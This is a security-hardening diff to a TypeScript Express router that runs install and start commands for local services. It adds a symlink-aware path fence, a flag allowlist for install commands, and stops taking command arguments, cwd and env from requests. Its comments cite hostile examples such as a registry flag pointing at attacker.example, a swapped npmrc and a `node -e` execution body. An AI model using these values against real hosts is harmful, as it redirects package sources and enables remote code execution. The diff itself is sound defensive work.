@@ -155,14 +155,35 @@ router.get('/scan', async (_req: Request, res: Response) => {
   }
 });
 
+// Resolve every symlink in a path, or null when it cannot be resolved
+// (ENOENT on a missing component, EACCES on an unreadable one). Mirrors the
+// `realpathOrSelf` idiom ConfigManager uses, but the caller here needs to tell
+// "does not resolve" apart from "resolves to itself" — an unresolvable path is
+// never a service directory.
+function realPathOrNull(target: string): string | null {
+  try {
+    return fs.realpathSync(target);
+  } catch {
+    return null;
+  }
+}
+
 // Resolve and sanity-check the servicePath both preparation endpoints take.
-// Returns the resolved directory, or answers the response and returns null.
+// Returns the REAL directory, or answers the response and returns null.
 //
 // The path is confined to the project root: these endpoints run commands on
 // the host, and every legitimate caller (the dashboard onboarding, `lss`)
 // works from `GET /scan`, which never looks outside it. Without the fence the
 // pair would be an arbitrary-directory execution surface for anything that can
 // reach the port.
+//
+// The fence compares REAL paths, not lexical ones: `path.relative()` only
+// looks at the string, so a symlink sitting inside the project root but
+// pointing outside it (`services/orders` -> `/etc`) satisfies a lexical check
+// while statSync — and the spawn that follows — happily walk through it.
+// Resolving both sides first means the comparison is about where the path
+// actually lands, and the resolved path is what is handed to the runner, which
+// also shrinks the window between the check and the spawn.
 function resolveServiceDir(res: Response, servicePath: unknown): string | null {
   if (!servicePath || typeof servicePath !== 'string') {
     res.status(400).json({ error: 'servicePath is required' });
@@ -174,18 +195,30 @@ function resolveServiceDir(res: Response, servicePath: unknown): string | null {
     return null;
   }
   const projectRoot = ConfigManager.getInstance().getProjectRoot();
-  const relative = path.relative(projectRoot, resolved);
+  // `getProjectRoot()` already realpath-resolves, so this is belt-and-braces
+  // for a root that comes from configuration: a root that cannot be resolved
+  // is a misconfiguration rather than a caller error, so it keeps its lexical
+  // form and still fences (nothing real can sit under a path that does not
+  // exist, so every candidate is rejected below).
+  const realRoot = realPathOrNull(projectRoot) ?? projectRoot;
+  const realDir = realPathOrNull(resolved);
+  if (!realDir) {
+    res.status(400).json({ error: `Not a directory: ${resolved}` });
+    return null;
+  }
+  const relative = path.relative(realRoot, realDir);
   if (relative.startsWith('..') || path.isAbsolute(relative)) {
     res.status(400).json({ error: `Service path must be inside the project root (${projectRoot})` });
     return null;
   }
-  // existsSync + statSync are two syscalls: the directory can vanish between
-  // them, and statSync throws on EACCES. A throw inside an async handler is an
-  // unhandled rejection that answers nothing and takes the process down under
-  // Node's default policy, so it is treated as "not a directory" here.
+  // realpathSync + statSync are still two syscalls: the directory can vanish
+  // between them, and statSync throws on EACCES. A throw inside an async
+  // handler is an unhandled rejection that answers nothing and takes the
+  // process down under Node's default policy, so it is treated as "not a
+  // directory" here — the same reasoning as before, now one syscall later.
   let isDirectory = false;
   try {
-    isDirectory = fs.statSync(resolved).isDirectory();
+    isDirectory = fs.statSync(realDir).isDirectory();
   } catch {
     isDirectory = false;
   }
@@ -193,7 +226,7 @@ function resolveServiceDir(res: Response, servicePath: unknown): string | null {
     res.status(400).json({ error: `Not a directory: ${resolved}` });
     return null;
   }
-  return resolved;
+  return realDir;
 }
 
 // Keep the last chunk of a long install/package log — the tail is where the
@@ -213,6 +246,39 @@ function outputTail(stdout: string, stderr: string, limit = 8000): string {
 const INSTALL_RUNNERS = ['npm', 'yarn', 'pnpm'];
 const INSTALL_VERBS = ['install', 'ci', 'i', 'add'];
 
+// The flags an install may carry, as an ALLOWLIST — anything else is denied.
+// "Every token after the verb starts with a dash" is not a check: a flag is not
+// inert, it carries a value, and the dangerous ones look exactly like the
+// harmless ones.
+//   --registry=http://attacker.example  redirects WHERE THE CODE COMES FROM,
+//                                       and its install scripts then run here
+//   --userconfig=/tmp/evil.npmrc        swaps the whole npmrc (registry + auth)
+//   --prefix=/tmp/x  --cwd=/etc  --dir=/etc
+//                                       relocate the install and so defeat the
+//                                       project-root fence resolveServiceDir
+//                                       applies one layer up
+// Deny-listing those cannot close the class — three package managers keep
+// adding flags, and every new one would be allowed by default. So only the
+// flags a real caller needs to say "install what this service declares"
+// survive, and none of them names a location.
+const INSTALL_ALLOWED_FLAGS = new Set([
+  // Which dependency groups to install.
+  '--production',
+  // Lockfile strictness, in the npm/yarn/pnpm spellings.
+  '--frozen-lockfile', '--no-frozen-lockfile', '--immutable',
+  // Resolution/network behaviour that stays within the configured registry.
+  '--no-audit', '--no-fund', '--prefer-offline', '--offline', '--legacy-peer-deps', '--force',
+  // Verbosity.
+  '--silent', '--quiet',
+]);
+
+// Flags accepted both bare (`--omit`) and value-carrying (`--omit=dev`). The
+// value is unconstrained on purpose: these name a dependency group
+// (dev/optional/peer) or a log level, so an unexpected one makes the package
+// manager complain — it can never point the install at another location or
+// another registry, which is the only property the allowlist exists to defend.
+const INSTALL_ALLOWED_VALUE_FLAGS = new Set(['--omit', '--include', '--loglevel']);
+
 function installCommandError(command: string): string | null {
   const [runner, verb, ...rest] = command.split(/\s+/);
   if (!INSTALL_RUNNERS.includes(runner)) {
@@ -225,10 +291,22 @@ function installCommandError(command: string): string | null {
   if (!INSTALL_VERBS.includes(verb)) {
     return `Command not allowed — subcommand must be one of: ${INSTALL_VERBS.join(', ')}`;
   }
-  // Everything after the verb must be a flag: a positional would be a package
-  // name (or worse) rather than "install what this service declares".
-  const positional = rest.find(token => !token.startsWith('-'));
-  return positional ? `Command not allowed — unexpected argument "${positional}"` : null;
+  for (const token of rest) {
+    // A positional would be a package name (or worse) rather than "install
+    // what this service declares" — including the value of a space-separated
+    // flag (`--omit dev`), which is why only the `--flag=value` spelling gets
+    // through.
+    if (!token.startsWith('-')) {
+      return `Command not allowed — unexpected argument "${token}"`;
+    }
+    // Match `--flag=value` on its name; a short flag (`-g`, `-D`) has no '='
+    // and appears in neither list, so it is rejected here as well.
+    const flag = token.split('=')[0];
+    if (!INSTALL_ALLOWED_FLAGS.has(token) && !INSTALL_ALLOWED_VALUE_FLAGS.has(flag)) {
+      return `Command not allowed — flag not permitted: "${flag}"`;
+    }
+  }
+  return null;
 }
 
 // Install a service's dependencies, so onboarding can prepare a freshly cloned
@@ -375,6 +453,20 @@ router.patch('/:name/status', async (req: Request, res: Response) => {
   }
 });
 
+// Which npm script `stage` may select. It is interpolated into the script name
+// `start:${stage}` and handed to spawn() as one argv element — never a shell
+// string — so this is not about shell injection: it constrains WHICH script of
+// the service's own package.json a caller can pick, keeping the request from
+// naming a path (`start:../../thing`) or smuggling a second argv token past a
+// layer that splits on whitespace.
+const STAGE_PATTERN = /^[A-Za-z0-9._-]+$/;
+
+// Only package managers. The argv below is always the `run <script>` idiom, so
+// `node`/`npx` cannot even express it (`node run start` is meaningless) — and
+// they are exactly what turned this endpoint into an execution primitive:
+// `node -e "<any js>"` used to be a valid body.
+const START_RUNNERS = ['npm', 'yarn', 'pnpm'];
+
 // Start a service process (serverless offline / npm start)
 router.post('/:name/start', async (req: Request, res: Response) => {
   try {
@@ -389,21 +481,29 @@ router.post('/:name/start', async (req: Request, res: Response) => {
       return res.status(404).json({ error: 'Service not found' });
     }
 
-    const { cwd, command, args, env, stage } = req.body || {};
-    
-    // Validate command whitelist
-    const allowedCommands = ['npm', 'npx', 'yarn', 'node'];
-    if (command && !allowedCommands.includes(command)) {
+    // The server decides WHAT runs; the request only selects which service, and
+    // optionally which package manager and which start script. `cwd`, `args`
+    // and `env` used to come from the body and go straight into spawn(), which
+    // made this a general command runner for anything able to reach the port —
+    // no auth, `cors()` wide open, the listener bound to every interface, and
+    // the service names handed out by GET /api/services. They are not read at
+    // all now; no caller in the dashboard, the client or the CLI ever sent them.
+    const { command, stage } = req.body || {};
+
+    if (stage && (typeof stage !== 'string' || !STAGE_PATTERN.test(stage))) {
+      return res.status(400).json({ error: 'Invalid stage' });
+    }
+
+    // Message kept verbatim — it is the documented answer for this rejection.
+    if (command && !START_RUNNERS.includes(command)) {
       return res.status(400).json({ error: 'Command not allowed' });
     }
-    
-    const runArgs = args && Array.isArray(args) && args.length > 0 ? args : ['run', stage ? `start:${stage}` : 'start'];
 
     const result = processManager.start(serviceName, {
-      cwd: cwd || metadata.root,
+      // Always the registered root: the only directory this service is.
+      cwd: metadata.root,
       command,
-      args: runArgs,
-      env,
+      args: ['run', stage ? `start:${stage}` : 'start'],
     });
 
     await cache.updateMetadata(serviceName, { status: 'running', pid: result.pid || undefined });
